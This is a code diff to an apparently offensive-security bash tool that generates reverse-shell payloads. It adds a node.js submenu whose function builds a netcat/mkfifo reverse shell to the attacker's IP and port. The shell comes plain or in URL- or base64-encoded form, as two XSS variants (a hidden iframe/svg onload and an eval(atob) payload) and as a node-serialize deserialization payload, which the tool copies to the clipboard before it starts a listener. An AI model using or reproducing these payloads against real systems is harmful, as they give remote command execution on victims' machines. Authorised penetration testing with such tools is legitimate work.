@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.4.9"
+version="1.5.0"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -48,12 +48,12 @@ then
 fi
 
   if [ $(ps -ef | grep -c updog) == 2 ]
-            then
-                echo "🟢 Updog is listening on $updog_port, serving folder: $updog_dir"
+    then
+        echo "🟢 Updog is listening on $updog_port, serving folder: $updog_dir"
                 
         
-            else
-                echo "🔴 Updog is not running"
+    else
+        echo "🔴 Updog is not running"
               
     fi
 echo
@@ -872,6 +872,54 @@ fi
 listen
 }
 
+function node () {
+    if [ $usingngrok == 1 ]
+then 
+    IP=$ngrokIP
+    PORT=$ngrokPORT
+fi
+header
+rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh')"
+
+if [[ $1 == "url" ]] 
+then
+    rev=$(urlencodeme "$rev")
+elif [[ $1 == "urlx2" ]] 
+then
+    rev=$(urlencodeme "$rev")
+    rev=$(urlencodeme "$rev")
+
+elif [[ $1 == "base64" ]] 
+then
+    rev=$(echo -n $rev|$benc --base64url -w0)
+
+
+elif [[ $1 == "xss1" ]] 
+then
+    rev="<iframe/style='position:absolute;top:-9999px'/srcdoc=<svg onload=\"require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh')\"\\>"
+
+elif [[ $1 == "xss2" ]]
+then 
+    rev="require('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh')"
+    rev=$(echo -n $rev|$benc --base64url -w0)
+    rev="><svg id=$rev onload=eval(atob(this.id))>"
+
+elif [[ $1 == "deserial" ]] 
+then
+    rev="[{\"rce\":\"_\$\$ND\"+\"_FUNC\$\$_func\"+\"tion(){\\nrequire('child_process').exec('rm /tmp/meh;mkfifo /tmp/meh; nc $IP $PORT 0</tmp/meh | /bin/sh >/tmp/meh 2>&1; rm /tmp/meh', function(error,\\nstdout, stderr) { console.log(stdout) });\\n}()\"}]"
+
+fi
+
+
+
+if [[ $OS == "Darwin" ]]
+then
+   echo -n $rev | pbcopy
+else 
+    echo -n $rev | xclip -sel c
+fi
+listen
+}
 
 
 function open_s () {
@@ -1667,6 +1715,57 @@ Choose an option:  "
 
 
 
+submenu_nodejs() {
+header
+    echo -ne "
+$(blueprint 'node.js')
+$(greenprint '1)') No encoding
+$(greenprint '2)') Base64 encoded
+$(greenprint '3)') URL encoded
+$(greenprint '4)') Double URL encoded
+$(greenprint '5)') XSS variant 1
+$(greenprint '6)') XSS variant 2
+$(greenprint '7)') Deserialize
+$(magentaprint 'm)') Go Back to Main Menu
+$(redprint '0)') Exit
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        node 
+        ;;
+    2)
+        node "base64"
+        ;;
+    3)
+        node "url"
+        ;;
+    4)
+        node "urlx2"
+        ;;
+    5)
+        node "xss1"
+        ;;
+    6)
+        node "xss2"
+        ;;
+    7)
+        node "deserial"
+        ;;
+    m)
+        mainmenu
+        ;;
+    0)
+        fn_bye
+        ;;
+    
+    *)
+        fn_fail
+        ;;
+    esac
+}
+
 submenu_webshells() {
 header
     echo -ne "
@@ -2411,6 +2510,7 @@ $(greenprint '12)') Golang
 $(greenprint '13)') Files 
 $(greenprint '14)') Webshells 
 $(greenprint '15)') Reflective C# Shell
+$(greenprint '16)') node.js
 $(greenprint 'u)') Start/Stop Updog 
 $ngrok_choice
 $(redprint '0)') Exit
@@ -2475,6 +2575,10 @@ Choose an option:  "
     15)
         input
         submenu_powershell_reflective
+        ;;
+    16) 
+        input 
+        submenu_nodejs
         ;;
     u)
         input "updog"
